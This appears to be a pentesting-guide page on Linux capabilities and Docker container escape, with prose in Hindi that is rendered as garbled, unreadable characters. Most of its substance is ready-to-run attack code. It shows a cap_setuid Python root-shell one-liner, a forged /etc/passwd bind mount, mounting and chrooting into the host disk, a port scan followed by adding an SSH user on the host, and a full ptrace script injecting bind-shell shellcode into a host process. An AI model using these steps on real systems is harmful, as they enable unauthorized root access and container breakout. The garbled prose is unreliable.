**рдХреНрд╖рдорддрд╛-рдЬрд╛рдЧрд░реВрдХ рдмрд╛рдЗрдирд░реА** рдирдИ рдХреНрд╖рдорддрд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░реЗрдВрдЧреА рдЬреЛ рдкрд░реНрдпрд╛рд╡рд░рдг рджреНрд╡рд╛рд░рд╛ рджреА рдЧрдИ рд╣реИрдВ, рд╣рд╛рд▓рд╛рдВрдХрд┐ **рдХреНрд╖рдорддрд╛-рдореВрд░реНрдЦ рдмрд╛рдЗрдирд░реА рдЙрдиреНрд╣реЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреА** рдХреНрдпреЛрдВрдХрд┐ рд╡реЗ рдЙрдиреНрд╣реЗрдВ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдирд╣реАрдВ рдХрд░реЗрдВрдЧреАред рдпрд╣ рдХреНрд╖рдорддрд╛-рдореВрд░реНрдЦ рдмрд╛рдЗрдирд░реА рдХреЛ рд╡рд┐рд╢реЗрд╖ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдЕрд╡рд░реЛрдзрд┐рдд рдмрдирд╛рддрд╛ рд╣реИ рдЬреЛ рдмрд╛рдЗрдирд░реА рдХреЛ рдХреНрд╖рдорддрд╛рдПрдВ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред

## рд╕реЗрд╡рд╛ рдХреНрд╖рдорддрд╛рдПрдВ

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ **рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓ рд░рд╣реА рд╕реЗрд╡рд╛ рдХреЛ рд╕рднреА рдХреНрд╖рдорддрд╛рдПрдВ рд╕реМрдВрдкреА рдЬрд╛рдПрдЧреА**, рдФрд░ рдХрдИ рдЕрд╡рд╕рд░реЛрдВ рдореЗрдВ рдпрд╣ рдЦрддрд░рдирд╛рдХ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред\
рдЗрд╕рд▓рд┐рдП, рдПрдХ **рд╕реЗрд╡рд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди** рдлрд╝рд╛рдЗрд▓ рдХреНрд╖рдорддрд╛рдПрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рдЗрд╕реЗ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, **рдФрд░** рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЬреЛ рд╕реЗрд╡рд╛ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП, рдЕрдирд╛рд╡рд╢реНрдпрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рд╕реЗрд╡рд╛ рди рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдПред
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдореЗрдВ рдХреНрд╖рдорддрд╛рдПрдВ

рдбреЙрдХрд░ рджреНрд╡рд╛рд░рд╛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдХрдВрдЯреЗрдирд░реНрд╕ рдХреЛ рдХреБрдЫ рдХреНрд╖рдорддрд╛рдПрдВ рд╕реМрдВрдкреА рдЬрд╛рддреА рд╣реИрдВред рдЗрди рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдЬрд╛рдВрдЪрдирд╛ рдмрд╣реБрдд рдЖрд╕рд╛рди рд╣реИ, рдЗрд╕рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдЪрд▓рд╛рдПрдВ:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

тАЛтАЛтАЛтАЛтАЛтАЛтАЛтАЛтАЛтАЛ[**RootedCON**](https://www.rootedcon.com/) рд╕реНрдкреЗрди рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрд╛рд░реНрдпрдХреНрд░рдо рд╣реИ рдФрд░ рдпреВрд░реЛрдк рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИред **рддрдХрдиреАрдХреА рдЬреНрдЮрд╛рди рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджреЗрдиреЗ рдХреА рдорд┐рд╢рди рдХреЗ рд╕рд╛рде**, рдпрд╣ рдХрд╛рдВрдЧреНрд░реЗрд╕ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдФрд░ рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рд╢реЗрд╖рдЬреНрдЮреЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдмрд▓рддрд╛ рд╣реБрдЖ рдорд┐рд▓рди рд╕реНрдерд▓ рд╣реИред

{% embed url="https://www.rootedcon.com/" %}

## Privesc/Container Escape

рдпрджрд┐ рдЖрдк **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░рд┐рдд рдСрдкрд░реЗрд╢рди рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдЕрдкрдиреЗ рдЦреБрдж рдХреЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рд╕реАрдорд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, chroot рд╕реЗрдЯ рдХрд░рдиреЗ рдФрд░ рд╕реЙрдХреЗрдЯ рд╕реЗ рдмрд╛рдЗрдВрдб рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж), рддреЛ рдХреНрд╖рдорддрд╛рдПрдВ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддреА рд╣реИрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрдиреНрд╣реЗрдВ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрдм рдЖрдк рдЙрдиреНрд╣реЗрдВ рджреБрд╖реНрдЯ рдЖрджреЗрд╢ рдпрд╛ рддрд░реНрдХ рдкрд╛рд╕ рдХрд░рдХреЗ рдЪрд▓рд╛рддреЗ рд╣реИрдВ рдЬреЛ рдлрд┐рд░ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рд╛рдП рдЬрд╛рддреЗ рд╣реИрдВред

рдЖрдк `setcap` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд╛рд░реНрдпрдХреНрд░рдореЛрдВ рдкрд░ рдХреНрд╖рдорддрд╛рдПрдВ рдереЛрдк рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ `getcap` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрдирдХреА рдХреНрд╡реЗрд░реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep` рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк рдХреНрд╖рдорддрд╛ рдХреЛ рдЬреЛрдбрд╝ рд░рд╣реЗ рд╣реИрдВ ("-" рдЗрд╕реЗ рд╣рдЯрд╛ рджреЗрдЧрд╛) рдЬреИрд╕реЗ рдХрд┐ Effective рдФрд░ Permitted.

рдПрдХ рд╕рд┐рд╕реНрдЯрдо рдпрд╛ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдХрд╛рд░реНрдпрдХреНрд░рдореЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:
```bash
getcap -r / 2>/dev/null
```
### рдЙрджрд╛рд╣рд░рдг рдХрд╛ рд╢реЛрдз

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдореЗрдВ `/usr/bin/python2.6` рдмрд╛рдЗрдирд░реА рдкреНрд░рд┐рд╡реЗрд╕реНрдХ рдХреЗ рд▓рд┐рдП рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рдкрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**рдЯреАрд╕реАрдкреАрдбрдВрдк** рдХреЛ **рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкреИрдХреЗрдЯ рд╕реНрдирд┐рдл рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ** рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ **рдХреНрд╖рдорддрд╛рдПрдВ**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### "рдЦрд╛рд▓реА" рдХреНрд╖рдорддрд╛рдУрдВ рдХрд╛ рд╡рд┐рд╢реЗрд╖ рдорд╛рдорд▓рд╛

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХрд┐рд╕реА рдкреНрд░реЛрдЧреНрд░рд╛рдо рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЦрд╛рд▓реА рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рджреА рдЬрд╛ рд╕рдХрддреА рд╣реИ, рдФрд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдПрдХ рд╕реЗрдЯ-рдпреВрдЬрд╝рд░-рдЖрдИрдбреА-рд░реВрдЯ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдкреНрд░реЛрд╕реЗрд╕ рдХреЗ рдЗрдлрд╝реЗрдХреНрдЯрд┐рд╡ рдФрд░ рд╕реЗрд╡реНрдб рд╕реЗрдЯ-рдпреВрдЬрд╝рд░-рдЖрдИрдбреА рдХреЛ 0 рдореЗрдВ рдмрджрд▓рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЙрд╕ рдкреНрд░реЛрд╕реЗрд╕ рдХреЛ рдХреЛрдИ рдХреНрд╖рдорддрд╛рдПрдБ рдирд╣реАрдВ рджреЗрддрд╛ рд╣реИред рдпрд╛ рд╕реАрдзреЗ рд╢рдмреНрджреЛрдВ рдореЗрдВ рдХрд╣реЗрдВ рддреЛ, рдЕрдЧрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ рдмрд╛рдЗрдирд░реА рд╣реИ рдЬреЛ:

1. рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡рд╛рдорд┐рддреНрд╡рд┐рдХ рдирд╣реАрдВ рд╣реИ
2. `SUID`/`SGID` рдмрд┐рдЯ рд╕реЗрдЯ рдирд╣реАрдВ рд╣реИрдВ
3. рдЦрд╛рд▓реА рдХреНрд╖рдорддрд╛рдПрдБ рд╕реЗрдЯ рд╣реИрдВ (рдЙрджрд╛.: `getcap myelf` `myelf =ep` рд▓реМрдЯрд╛рддрд╛ рд╣реИ)

рддреЛ **рд╡рд╣ рдмрд╛рдЗрдирд░реА рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓реЗрдЧреА**ред

## CAP\_SYS\_ADMIN

[**CAP\_SYS\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) рдмрдбрд╝реЗ рд╣рд┐рд╕реНрд╕реЗ рдореЗрдВ рдПрдХ рд╕рднреА рдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдЖрд╡рд╢реНрдпрдХ рдХреНрд╖рдорддрд╛ рд╣реИ, рдпрд╣ рдЖрд╕рд╛рдиреА рд╕реЗ рдЕрддрд┐рд░рд┐рдХреНрдд рдХреНрд╖рдорддрд╛рдУрдВ рдпрд╛ рдкреВрд░реНрдг рд░реВрдЯ (рдЖрдорддреМрд░ рдкрд░ рд╕рднреА рдХреНрд╖рдорддрд╛рдУрдВ рдХрд╛ рдкрд╣реБрдВрдЪ) рдХреА рдУрд░ рд▓реЗ рдЬрд╛ рд╕рдХрддреА рд╣реИред `CAP_SYS_ADMIN` рдХреЛ рдХрдИ рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ рдСрдкрд░реЗрд╢рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ рдХрдВрдЯреЗрдирд░реНрд╕ рд╕реЗ рдЫреЛрдбрд╝рдирд╛ рдХрдард┐рди рд╣реЛрддрд╛ рд╣реИ рдЕрдЧрд░ рд╡реЗ рдХрдВрдЯреЗрдирд░ рдХреЗ рднреАрддрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░рд┐рдд рдСрдкрд░реЗрд╢рди рдХрд░рддреЗ рд╣реИрдВред рдЗрд╕ рдХреНрд╖рдорддрд╛ рдХреЛ рдЖрдорддреМрд░ рдкрд░ рдкреВрд░реЗ рд╕рд┐рд╕реНрдЯрдо рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рд╡реНрдпрдХреНрддрд┐рдЧрдд рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд░рдЦрдирд╛ рдЖрдо рд╣реЛрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЗрд╕рдХреА рдорджрдж рд╕реЗ **рдбрд┐рд╡рд╛рдЗрд╕ рдорд╛рдЙрдВрдЯ** рдХрд░рдиреЗ рдпрд╛ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреЗ рд▓рд┐рдП **рд░рд┐рд▓реАрдЬрд╝_рдПрдЬреЗрдВрдЯ** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред

**рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Python рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рд╡рд╛рд╕реНрддрд╡рд┐рдХ _passwd_ рдлрд╝рд╛рдЗрд▓ рдХреЗ рдКрдкрд░ рдПрдХ рд╕рдВрд╢реЛрдзрд┐рдд _passwd_ рдлрд╝рд╛рдЗрд▓ рдорд╛рдЙрдВрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
рдФрд░ рдЕрдВрдд рдореЗрдВ `/etc/passwd` рдкрд░ рд╕рдВрд╢реЛрдзрд┐рдд `passwd` рдлрд╝рд╛рдЗрд▓ рдХреЛ **рдорд╛рдЙрдВрдЯ** рдХрд░реЗрдВ:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
рдФрд░ рдЖрдк **`su` рдХреЗ рд░реВрдк рдореЗрдВ рд░реВрдЯ** рдХреЗ рд░реВрдк рдореЗрдВ рдкрд╛рд╕рд╡рд░реНрдб "рдкрд╛рд╕рд╡рд░реНрдб" рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд░ рд╕рдХреЗрдВрдЧреЗред

**рдкрд░реНрдпрд╛рд╡рд░рдг рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг (Docker breakout)**

рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рд╕рдХреНрд╖рдо рдХреНрд╖рдорддрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
рдкрд┐рдЫрд▓реЗ рдЖрдЙрдЯрдкреБрдЯ рдореЗрдВ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ SYS_ADMIN рдХреНрд╖рдорддрд╛ рд╕рдХреНрд╖рдо рд╣реИред

* **рдорд╛рдЙрдВрдЯ**

рдЗрд╕рд╕реЗ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдХреЛ **рд╣реЛрд╕реНрдЯ рдбрд┐рд╕реНрдХ рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░рдиреЗ рдФрд░ рдЗрд╕реЗ рд╕реНрд╡рддрдВрддреНрд░ рд░реВрдк рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИ:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **рдкреВрд░реНрдг рдкрд╣реБрдВрдЪ**

рдкрд┐рдЫрд▓реА рд╡рд┐рдзрд┐ рдореЗрдВ рд╣рдордиреЗ рдбреЙрдХрд░ рд╣реЛрд╕реНрдЯ рдбрд┐рд╕реНрдХ рддрдХ рдкрд╣реБрдВрдЪрд╛ред
рдпрджрд┐ рдЖрдкрдХреЛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рд╣реЛрд╕реНрдЯ рдкрд░ рдПрдХ **SSH** рд╕рд░реНрд╡рд░ рдЪрд▓ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк **рдбреЙрдХрд░ рд╣реЛрд╕реНрдЯ** рдбрд┐рд╕реНрдХ рдореЗрдВ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ SSH рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк рд╣реЛрд╕реНрдЯ рдХреЗ рдЕрдВрджрд░ рдЪрд▓ рд░рд╣реЗ рдХрд┐рд╕реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╢реЗрд▓рдХреЛрдб рд╕рдВрдпреЛрдЬрд┐рдд рдХрд░рдХреЗ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рд╕рдХрддреЗ рд╣реИрдВред** рд╣реЛрд╕реНрдЯ рдХреЗ рдЕрдВрджрд░ рдЪрд▓ рд░рд╣реА рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдХрдВрдЯреЗрдирд░ рдХреЛ рдХрдо рд╕реЗ рдХрдо **`--pid=host`** рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред

[**CAP\_SYS\_PTRACE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) `ptrace(2)` рдФрд░ рд╣рд╛рд▓ рд╣реА рдореЗрдВ рдкреНрд░рд╕реНрддреБрдд рдХреА рдЧрдИ рдХреНрд░реЙрд╕ рдореЗрдореЛрд░реА рдЕрдЯреИрдЪ рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓реНрд╕ рдЬреИрд╕реЗ `process_vm_readv(2)` рдФрд░ `process_vm_writev(2)` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдпрджрд┐ рдЗрд╕ рдХреНрд╖рдорддрд╛ рдХреА рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рддреА рд╣реИ рдФрд░ `ptrace(2)` рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ рд╕реНрд╡рдпрдВ рдПрдХ рд╕реЗрдХрдВрдк рдлрд╝рд┐рд▓реНрдЯрд░ рджреНрд╡рд╛рд░рд╛ рдЕрд╡рд░реБрджреНрдз рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдПрдХ рд╣рдорд▓рд╛рд╡рд░реНрддреА рдХреЛ рдЕрдиреНрдп рд╕реЗрдХрдВрдк рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЛ рджреМрд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛, [seccomp рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдкрд░ bypass рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП PoC](https://gist.github.com/thejh/8346f47e359adecd1d53) рджреЗрдЦреЗрдВ рдпрд╛ **рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд PoC** рджреЗрдЦреЗрдВ:

**рдЙрджрд╛рд╣рд░рдг рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг (gdb)**

`ptrace` рдХреНрд╖рдорддрд╛ рдХреЗ рд╕рд╛рде `gdb`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
